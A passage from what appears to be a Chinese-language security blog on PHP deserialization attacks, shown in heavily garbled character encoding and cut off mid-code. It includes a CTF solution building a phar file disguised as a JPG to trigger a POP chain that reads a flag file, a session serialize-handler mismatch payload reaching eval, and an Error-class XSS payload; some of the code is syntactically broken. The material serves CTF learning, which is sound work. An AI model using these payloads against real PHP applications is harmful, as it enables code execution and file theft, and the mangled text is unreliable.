popé“¾äº†</li></ul><p>ç°åœ¨åˆ†æpopé“¾</p><ul><li>åœ¨Showä¸­ï¼Œæç¤ºæˆ‘ä»¬fileä¸ºphar.jpg</li><li>Testä¸­æœ‰ä¸€ä¸ª<code>base64_encode</code>å‡½æ•°å’Œ<code>file_get_content</code>å‡½æ•°å¼•èµ·æ³¨æ„ï¼Œåº”è¯¥æ˜¯é€šè¿‡è¿™ä¸ªå»æŠŠflagçš„å†…å®¹å¼„è¿›textã€‚è¿™æ˜¯å€’æ•°ç¬¬äºŒæ­¥</li><li>è¦æ‰“å°è¿™ä¸ªå‡½æ•°å°±é€šè¿‡Cle4ré‡Œé¢ä¸€ä¸ªechoï¼Œæ‰€ä»¥éœ€è¦è®©$nameæŠŠflagçš„å†…å®¹å¸¦è¿›å»ï¼Œæœ€åæ‰“å°å‡ºæ¥</li><li>æ‰€ä»¥æˆ‘ä»¬è¦è®©<code>value</code>ä¸º<code>f1ag.php</code></li><li>valueæ˜¯é€šè¿‡<code>params[$key]</code>å¾—åˆ°çš„ï¼Œæ‰€ä»¥æ„é€ è¿™ä¸ªparams[key,f1ag.php]</li><li>æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è§¦å‘<code>__get</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè®¿é—®Testä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„å˜é‡</li><li>ç°åœ¨å»çœ‹å…¶ä»–ç±»</li><li>æ³¨æ„åˆ°Showé‡Œé¢æœ‰ä¸€ä¸ª<code>$this-&gt;str[&#39;str&#39;]-&gt;source</code>ï¼Œå¦‚æœæˆ‘ä»¬è®©<code>$this-&gt;str[&#39;str&#39;]</code>æ˜¯Testç±»ï¼Œé‚£ä¹ˆTesté‡Œé¢æ²¡æœ‰sourceï¼Œå°±ä¼šå»<code>__get</code>å¹¶ä¸”æŠŠsourceçš„å€¼ä¼ è¿›$key</li><li>æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è·³è¿›<code>__toString</code>ï¼Œçœ‹åˆ°constructé‡Œé¢æœ‰ä¸€ä¸ªechoï¼Œè‡ªç„¶æƒ³åˆ°é€šè¿‡è¿™ä¸ªechoæ¥è·³è¿›<code>__toString</code>ã€‚æ‰€ä»¥æˆ‘ä»¬è®©<code>$this-&gt;source;</code>å°±æ˜¯è¿™ä¸ªç±»è‡ªèº«ï¼Œé‚£ä¹ˆechoçš„æ—¶å€™å°±è·³è¿›è¿™ä¸ªç±»ä¸‹é¢çš„tostringï¼Œç„¶åæˆåŠŸè¿”å›content</li><li>æ‰€ä»¥è®©<code>$this-&gt;file</code>æ˜¯ä¸€ä¸ªç±»ã€‚echoè¿™ä¸ªç±»å°±è·³è¿›tostringã€‚</li></ul><h6 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h6><ul><li>æ•´ä¸ªååºåˆ—åŒ–ç»“æ„æ˜¯ï¼šå…ˆnew Cle4rï¼Œç„¶ånameä¼ Showè¿™ä¸ªç±»ã€‚Showç±»é‡Œé¢çš„sourceæ˜¯Showç±»ï¼Œstr[str]æ˜¯Testç±»ï¼ŒTesté‡Œé¢æ„é€ params[source,f1ag.phpçš„ç»å¯¹è·¯å¾„]</li><li>ç„¶åè¿™ä¸ªåºåˆ—åŒ–å¼„å¥½ä¹‹åå°±ç”Ÿæˆphar.jpgï¼Œä¸Šä¼ ï¼Œç„¶åfile.phpä¸­é€šè¿‡pharä¼ªåè®®åŒ…å«ï¼Œè§£æï¼Œæ‰§è¡Œååºåˆ—åŒ–</li></ul><h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Â class C1e4r</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $test;</span><br><span class="line">Â  Â  Â public $str;</span><br><span class="line">Â  Â  Â public function __construct($name)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;str = $name;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â class Show</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $source;</span><br><span class="line">Â  Â  Â public $str;</span><br><span class="line">Â  Â  Â  public function __construct($a)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  $this-&gt;str[str] = $a;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  </span><br><span class="line">Â &#125;</span><br><span class="line">Â class Test</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $file;</span><br><span class="line">Â  Â  Â public $params = &#123;&#x27;source&#x27;,&#x27;f1ag.phpçš„ç»å¯¹è·¯å¾„&#x27;&#125;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â $b = new Show();</span><br><span class="line">Â $b -&gt;source=$b;</span><br><span class="line">Â $b -&gt;str[&#x27;str&#x27;]=new Test();</span><br><span class="line">Â $c = new Cle4r($b); Â //æˆ–è€…$c=new Cle4r(); $c-&gt;str=$b;</span><br><span class="line">Â echo serialize($c)</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  </span><br><span class="line">Â //ç”Ÿæˆpharæ–‡ä»¶</span><br><span class="line">Â $phar = new Phar(&quot;exp.phar&quot;); //.pharæ–‡ä»¶</span><br><span class="line">Â $phar-&gt;startBuffering();</span><br><span class="line">Â $phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); //å›ºå®šçš„</span><br><span class="line">Â $phar-&gt;setMetadata($c); //è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span><br><span class="line">Â $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //éšä¾¿å†™ç‚¹ç”Ÿæˆä¸ªç­¾å</span><br><span class="line">Â $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>æœ€åæŠŠç”Ÿæˆçš„exp.pharæ”¹æˆexp.jpgï¼Œä¸Šä¼ å¹¶ä½¿ç”¨ä¼ªåè®®åŒ…å«</p><p><code>?file=phar://upload/1561385518.jpg</code></p><p>æˆåŠŸå¾—åˆ°base64ä¹‹åçš„flagå€¼</p><hr><h4 id="PHP-sessionååºåˆ—åŒ–"><a href="#PHP-sessionååºåˆ—åŒ–" class="headerlink" title="PHP-sessionååºåˆ—åŒ–"></a>PHP-sessionååºåˆ—åŒ–</h4><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><h6 id="session"><a href="#session" class="headerlink" title="session"></a>session</h6><p>é¦–å…ˆçœ‹ä¸€ä¸ªå¾ˆç®€å•çš„å›¾ç‰‡ç†è§£session</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1df47fdfc6f64b5fb692ddeed8f49580-1024x473.png"></p><p>ç®€å•æ¥è¯´ï¼Œsessionçš„è®¾ç½®å°±æ˜¯æŠŠä¸åŒçš„å®¢æˆ·ç«¯çš„ä¿¡æ¯æ‰“åŒ…å­˜å‚¨åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ï¼Œç„¶åç”¨cookieé‡Œé¢çš„sessionIDæ¥æŒ‡ä»£ä¸åŒçš„sessionæ–‡ä»¶ä»ã€è¿™é‡Œè¿™ä¸ªsessionæ–‡ä»¶åˆå¯ä»¥æ¶‰åŠåˆ°å…¶ä»–æ¼æ´ï¼Œæ¯”å¦‚åˆ©ç”¨sessionæ–‡ä»¶æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«åˆ©ç”¨ç­‰ç­‰ã€‘</p><p>å…·ä½“çš„å®ä¾‹åº”ç”¨ï¼šæ¯”å¦‚ä¸€ä¸ªç½‘ç«™çš„ç™»å½•éªŒè¯ï¼Œå¦‚æœç”¨æˆ·ç™»å½•æˆåŠŸäº†ï¼Œå°±å­˜å‚¨ä¸€ä¸ªsessionï¼Œå¹¶ä¸”ä¸€å¤©ä¹‹å†…ä¸ä¼šè¿‡æœŸï¼Œé‚£ä¹ˆç”¨æˆ·è¿™ä¸€å¤©ä¹‹å†…éƒ½å¯ä»¥åˆ©ç”¨sessionç›´æ¥ç™»å½•è€Œä¸ç”¨é‡å¤è¾“å…¥è´¦å¯†éªŒè¯</p><h6 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h6><ul><li>å¦‚æœæ¸¸è§ˆå™¨è®¿é—®æœåŠ¡å™¨ï¼Œå¦‚æœæ²¡æœ‰æºå¸¦SESSIONIDï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šåˆ›å»ºä¸€ä¸ªsessionï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªsessionçš„JSESSIONIDè¿”å›ç»™æ¸¸è§ˆå™¨ã€‚</li><li>å¦‚æœæ¸¸è§ˆå™¨æºå¸¦äº†SESSIONIDï¼Œé‚£ä¹ˆæ¸¸è§ˆå™¨åœ¨è®¿é—®æ—¶å°±ä¼šæºå¸¦ã€‚è€ŒæœåŠ¡å™¨åœ¨ä½¿ç”¨sessionæ—¶ï¼Œå°±ä¼šä½¿ç”¨è¿™ä¸ªJSESSIONIDçš„sessionã€‚</li></ul><blockquote><p>å¦‚æœä½ ä¸æƒ³åœ¨æ¯ä¸ªè„šæœ¬éƒ½ä½¿ç”¨session_startå‡½æ•°æ¥å¼€å¯sessionï¼Œå¯ä»¥åœ¨php.inié…ç½®æ–‡ä»¶é‡Œè®¾ç½®â€œsession.auto_start&#x3D;1â€ï¼Œåˆ™æ— é¡»æ¯æ¬¡ä½¿ç”¨sessionä¹‹å‰éƒ½è¦è°ƒç”¨session_startå‡½æ•°ã€‚ä½†å¯ç”¨è¯¥é€‰é¡¹ä¹Ÿæœ‰ä¸€å®šé™åˆ¶ï¼Œåˆ™ä¸èƒ½å°†å¯¹è±¡å­˜å…¥sessionä¸­ï¼Œå› ä¸ºç±»å®šä¹‰å¿…é¡»åœ¨å¯åŠ¨sessionä¹‹å‰åŠ è½½ã€‚æ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨php.iniä¸­çš„â€œsession.auto_start&#x3D;1â€å±æ€§æ¥å¼€å¯sessionã€‚</p></blockquote><h6 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h6><ol><li>PHPè„šæœ¬ä½¿ç”¨ session_start()æ—¶å¼€å¯<code>session</code>ä¼šè¯ï¼Œä¼šè‡ªåŠ¨æ£€æµ‹<code>PHPSESSID</code><ul><li>å¦‚æœ<code>Cookie</code>ä¸­å­˜åœ¨ï¼Œè·å–<code>PHPSESSID</code></li><li>å¦‚æœ<code>Cookie</code>ä¸­ä¸å­˜åœ¨ï¼Œåˆ›å»ºä¸€ä¸ª<code>PHPSESSID</code>ï¼Œå¹¶é€šè¿‡å“åº”å¤´ä»¥<code>Cookie</code>å½¢å¼ä¿å­˜åˆ°æµè§ˆå™¨</li></ul></li><li>åˆå§‹åŒ–è¶…å…¨å±€å˜é‡<code>$_SESSION</code>ä¸ºä¸€ä¸ªç©ºæ•°ç»„</li><li>PHPé€šè¿‡<code>PHPSESSID</code>å»æŒ‡å®šä½ç½®ï¼ˆ<code>PHPSESSID</code>æ–‡ä»¶å­˜å‚¨ä½ç½®ï¼‰åŒ¹é…å¯¹åº”çš„æ–‡ä»¶<ul><li>å­˜åœ¨è¯¥æ–‡ä»¶ï¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼ˆ<strong>é€šè¿‡ååºåˆ—åŒ–æ–¹å¼</strong>ï¼‰ï¼Œå°†æ•°æ®å­˜å‚¨åˆ°<code>$_SESSION</code>ä¸­</li><li>ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼š session_start()åˆ›å»ºä¸€ä¸ª<code>PHPSESSID</code>å‘½åæ–‡ä»¶</li></ul></li><li>ç¨‹åºæ‰§è¡Œç»“æŸï¼Œå°†<code>$_SESSION</code>ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®<strong>åºåˆ—åŒ–</strong>å­˜å‚¨åˆ°<code>PHPSESSID</code>å¯¹åº”çš„æ–‡ä»¶ä¸­</li></ol><h6 id="PHP-session-ååºåˆ—åŒ–æœºåˆ¶"><a href="#PHP-session-ååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHP session ååºåˆ—åŒ–æœºåˆ¶"></a>PHP session ååºåˆ—åŒ–æœºåˆ¶</h6><blockquote><p>åœ¨php.iniä¸­å­˜åœ¨session.serialize_handleré…ç½®ï¼Œå®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„<strong>å¤„ç†å™¨</strong>åå­—ï¼Œé»˜è®¤ä½¿ç”¨phpã€‚ phpä¸­çš„sessionä¸­çš„å†…å®¹æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ å­˜å‚¨æ–¹å¼ç”±é…ç½®é¡¹session.save_handlerç¡®å®šï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚</p></blockquote><h6 id="å¤„ç†å™¨-å¼•æ“"><a href="#å¤„ç†å™¨-å¼•æ“" class="headerlink" title="å¤„ç†å™¨(å¼•æ“)"></a>å¤„ç†å™¨(å¼•æ“)</h6><p><code>session.serialize_handler</code>æ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯<strong>å¤„ç†å™¨</strong>çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚</p><ul><li><strong>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></li><li><strong>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</strong></li><li><strong>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230711232450819-1024x309.png"></p><p>åœ¨PHPä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç <code>ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;);</code></p><blockquote><p>PHPä¸­sessionæœ¬èº«çš„åºåˆ—åŒ–<strong>æœºåˆ¶</strong>æ˜¯æ²¡æœ‰é—®é¢˜çš„ é—®é¢˜å‡ºåœ¨äº†å¦‚æœåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶é€‰æ‹©çš„<strong>å¤„ç†å™¨ä¸åŒ</strong>ï¼Œå°±ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ å½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ï¼Œå¯¹valueå¤šè¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–ï¼Œè¾¾åˆ°æˆ‘ä»¬è§¦å‘ååºåˆ—åŒ–çš„ç›®çš„</p></blockquote><h5 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p>å­˜åœ¨s1.phpå’Œs2.php,ä¸¤ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨çš„çš„sessionå¼•æ“ä¸ä¸€æ ·ï¼Œå°±å½¢æˆäº†ä¸€ä¸ªæ¼æ´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â //s1.phpä¸­ï¼Œä½¿ç”¨php_seriliseæ¥å¤„ç†sessionã€‚</span><br><span class="line">Â //php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</span><br><span class="line">Â &lt;?php</span><br><span class="line">Â  Â  Â ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">Â     session_start();</span><br><span class="line">Â  Â  Â $_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Â //s2.phpä¸­ï¼Œç”¨phpæ¥å¤„ç†session</span><br><span class="line">Â //php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</span><br><span class="line">Â &lt;?php</span><br><span class="line">Â     ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">Â     session_start();</span><br><span class="line">Â     class lemon&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â var $hi;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  public function __construct()&#123;</span><br><span class="line">    $this-&gt;hi=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line">     eval($this-&gt;hi);</span><br><span class="line">&#125;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬è®¿é—®s1,phpæ—¶ï¼Œæ„é€ å¦‚ä¸‹payloadï¼š</p><p>Â locallhost&#x2F;s1.php?a&#x3D;O:5:â€lemonâ€:1:{s:2:â€hiâ€;s:14:â€echo â€œspoockâ€;â€;}</p><p>ä¼ è¿›å»çš„ a åœ¨s1.phpä¸­è¿›è¡Œåºåˆ—åŒ–ï¼Œå¼•æ“æ˜¯php_serializeï¼Œ</p><p>æ‰€ä»¥æœ€åå­˜å‚¨çš„å†…å®¹æ˜¯ï¼š</p><p><code>a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175904124-2-1024x227.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175845894-2-1024x91.png"></p><p>ç„¶è€Œï¼Œåœ¨s2.phpä¸­ï¼Œæˆ‘ä»¬è¯»å–æ•°æ®å´é€‰æ‹©çš„phpï¼Œæ­¤æ—¶è¯»å–çš„å†…å®¹å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Â Array</span><br><span class="line">Â (</span><br><span class="line">Â  Â   [a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;] =&gt; __PHP_Incomplete_Class Object</span><br><span class="line">Â  Â  Â  Â   (</span><br><span class="line">Â  Â  Â  Â  Â  Â   [__PHP_Incomplete_Class_Name] =&gt; lemon</span><br><span class="line">Â  Â  Â  Â  Â  Â   [hi] =&gt; echo &quot;spoock&quot;;</span><br><span class="line">Â  Â  Â  Â   )</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â   [spoock] =&gt; O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br><span class="line">Â )</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨PHPå¼•æ“çš„æ—¶å€™ï¼ŒPHPå¼•æ“ä¼šç”¨ ä½œä¸º key å’Œ value çš„åˆ†éš”ç¬¦ï¼Œå°±ä¼šå°†<code> `a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;</code>ä½œä¸ºsessionçš„keyï¼Œå°†<code>O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code>ä½œä¸ºvalueï¼Œè¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå¾—åˆ°lemonè¿™ä¸ªç±»ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è®¿é—®us2.phpçš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„echo spockè¿™ä¸ªæ“ä½œã€‚</p><hr><h4 id="PHPåŸç”Ÿç±»çš„åˆ©ç”¨"><a href="#PHPåŸç”Ÿç±»çš„åˆ©ç”¨" class="headerlink" title="PHPåŸç”Ÿç±»çš„åˆ©ç”¨"></a>PHPåŸç”Ÿç±»çš„åˆ©ç”¨</h4><h5 id="åˆ©ç”¨æ–¹å‘"><a href="#åˆ©ç”¨æ–¹å‘" class="headerlink" title="åˆ©ç”¨æ–¹å‘"></a>åˆ©ç”¨æ–¹å‘</h5><ul><li>è¯»å–æ–‡ä»¶</li><li>æ„é€ xss</li><li>Errorç»•è¿‡</li><li>SSRF</li><li>è·å–æ³¨é‡Šå†…å®¹</li></ul><p>å‚è€ƒ</p><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><h5 id="åŸç”Ÿç±»æ¦‚å¿µ"><a href="#åŸç”Ÿç±»æ¦‚å¿µ" class="headerlink" title="åŸç”Ÿç±»æ¦‚å¿µ"></a>åŸç”Ÿç±»æ¦‚å¿µ</h5><p>åŸç”Ÿç±»å°±æ˜¯phpå†…ç½®ç±»ï¼Œä¸ç”¨å®šä¹‰phpè‡ªå¸¦çš„ç±»ï¼Œå³ä¸éœ€è¦åœ¨å½“å‰è„šæœ¬å†™å‡ºï¼Œä½†ä¹Ÿå¯ä»¥å®ä¾‹åŒ–çš„ç±»ã€‚</p><blockquote><p><strong>PHPåŸç”Ÿç±»å°±æ˜¯åœ¨æ ‡å‡†PHPåº“ä¸­å·²ç»å°è£…å¥½çš„ç±»</strong>ï¼Œè€Œåœ¨å…¶ä¸­ï¼Œæœ‰äº›ç±»å…·æœ‰ä¸€äº›åŠŸèƒ½ï¼Œä¾‹å¦‚æ–‡ä»¶è¯»å–ã€ç›®å½•éå†ç­‰ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬å¯ä¹˜ä¹‹æœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–è¿™äº›ç±»ï¼Œå°±å¯ä»¥å®ç°æ–‡ä»¶è¯»å–è¿™ç§æ•æ„Ÿæ“ä½œã€‚</p><p>åœ¨CTFä¸­ï¼Œæœ‰æ—¶ä¼šé‡åˆ°ä¸€äº›å¥‡æ€ªçš„é¢˜ï¼Œæ¯”å¦‚æ²¡æœ‰ç»™å‡ºååºåˆ—åŒ–çš„ç±»ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½å°±éœ€è¦ç”¨åˆ°PHPåŸç”Ÿç±»äº†</p></blockquote><p>å¸¸è§çš„åšé¢˜ä¼šé‡è§çš„ç±»æœ‰</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li><li>SplFileObject</li><li>â€¦</li></ul><p>è¿™äº›ç±»é‡Œé¢éƒ½æœ‰ä¸€äº›è‡ªå¸¦çš„æ–¹æ³•ï¼Œåˆç†åˆ©ç”¨å¯ä»¥è¾¾åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚</p><h5 id="XSS-By-Error-Exception"><a href="#XSS-By-Error-Exception" class="headerlink" title="XSS By Error&#x2F;Exception"></a>XSS By Error&#x2F;Exception</h5><h6 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><p>Error é€‚ç”¨äºPHP7ç‰ˆæœ¬ã€åœ¨å¼€å¯æŠ¥é”™çš„å‰æä¸‹ã€‘ï¼ŒExceptionåˆ™PHP5å’ŒPHP7éƒ½å¯ä»¥ã€åœ¨å¼€å¯æŠ¥é”™çš„å‰æä¸‹ã€‘ã€‚</p><h6 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h6><p><code>Error</code>ç±»ä¸­å«æœ‰ä¸€ä¸ª<code>__tostring</code>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœæŠŠå®ƒå½“åšå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œå°±ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ã€‚ä¾‹å¦‚æˆ‘ä»¬å¯¹å…¶è¿›è¡Œè¾“å‡ºæ“ä½œ(<code>echo</code>)ï¼Œæ­¤æ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>__tostring</code>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœ<code>Error</code>ç±»ä¸­å†…å®¹ä¸º<code>XSS</code>æ¶æ„è¯­å¥ï¼Œæ­¤æ—¶å°±ä¼šå¯¼è‡´XSS</p><h6 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â $a = unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">Â echo $a;</span><br><span class="line">Â ?&gt; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­ä¸­ï¼Œechoäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”æ²¡æœ‰ç»™å‡ºååºåˆ—åŒ–çš„ç±»ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦è€ƒè™‘åŸç”Ÿç±»å¹¶ä¸”å…³æ³¨_tostringè¿™ä¸ªæ–¹æ³•äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â $a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);//Exceptionç›´æ¥æ›¿æ¢Error</span><br><span class="line">Â echo urlencode(serialize($a)); Â </span><br><span class="line">Â 